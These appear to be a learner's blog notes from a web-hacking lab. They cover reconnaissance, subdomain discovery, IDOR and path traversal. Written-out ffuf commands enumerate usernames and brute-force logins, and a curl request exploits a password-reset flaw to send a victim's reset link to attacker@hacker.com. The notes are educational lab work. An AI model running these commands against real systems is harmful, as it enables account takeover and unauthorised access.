---
layout: default
title:  "Introduction-to-Web-Hacking"
date:   2022-04-13
---

### Introduction to Web Hacking

#### Content Discovery

- robots.txt:  which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website
- favicon: might be a leftover from the framework, so to point out which framework the website is using
(https://wiki.owasp.org/index.php/OWASP_favicon_database)
- sitemap.xml: a list of every file the website owner wishes to be listed on a search engine
- HTTP header:  webserver software and possibly the programming/scripting language in use.
- Framework Stack: might be some common vulnerability for the framework
- OSINT:
  - Google Dork: site; inurl; filetype; intitle
  - Wappalyzer: identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors, etc
  - Wayback machine: https://archive.org/web
  - S3 buckets: storage service provided by Amazon AWS; http(s)://{name}.s3.amazonaws.com; using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.
- Automated discovery: 
  - https://github.com/danielmiessler/SecLists
  - https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/
  - https://danielmiessler.com/study/ffuf/

#### Subdomain Enumeration

- OSINT - SSL/TLS Certificates: search "Certificate Transparency (CT) logs" 
  - http://crt.sh/
  - https://transparencyreport.google.com/https/certificates
- OSINT - search engine:
  - `-site:www.domain.com site:*.domain.com`
- DNS brute force: 
  - `dnsrecon -t brt -d domain.com`
  - `-d`: specify domain
  - `-t`: choose the type of enumeration
- OSINT - sublist3r: automate the above methods with python scripts
  - https://github.com/aboul3la/Sublist3r
- Brute force using namelist:
  - `user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.111.106 -fs {size} `
  - `-fs`: tell `ffuf`to ignore any results that are of the specific size
  - utilize Host Header

#### Authentication Bypass

- Username Enumeration
  - `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.143.33/customers/signup -mr "username already exists"`
  - `-w`: selects the file's location on the computer that contains the list of usernames that we're going to check exists
  - `-X`: specifies the request method, this will be a GET request by default, but it is a POST request in our example
  - `-d`: specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to FUZZ. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request
  - `-H`: used for adding additional headers to the request. In this instance, we're setting the Content-Type to the webserver knows we are sending form data
  - `-u`: specifies the URL we are making the request to
  - `-mr`: the text on the page we are looking for to validate we've found a valid username
  - moreabout content-type: https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST
- Username and password combination brute force
  - `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.143.33/customers/login -fc 200`
  - using multiple wordlists, so use W1 and W2 to distinguish and separated with comma
  - `-fc`: check for an HTTP status code other than 200
  - response code: 200 OK; 302 Found (one of the rediraction messages, meaning "URI of requested resource has been changed temporarily")
- Logical flaw:
  - the password reset email is sent using the data found in the PHP variable `$_REQUEST`
  - `curl 'http://10.10.66.106/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'`
  - have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.
- Hashing and encoding of cookie:
  - hash cracker: https://crackstation.net/

#### IDOR

- IDOR: Insecure Direct Object Reference, a type of access control vulnerability and webserver receives user-supplied inputs
- Encoded IDs: decode -> tamper -> encode -> submit
  - https://www.base64decode.org/
- Hashed IDs: https://crackstation.net/
- location: may not always be in the address bar; could be content the browser load via AJAX request or referenced in JavaScript file

#### File Inclusion

- dot-dot-slash attack: take advantage of moving the directory one step up using the double dots `../`








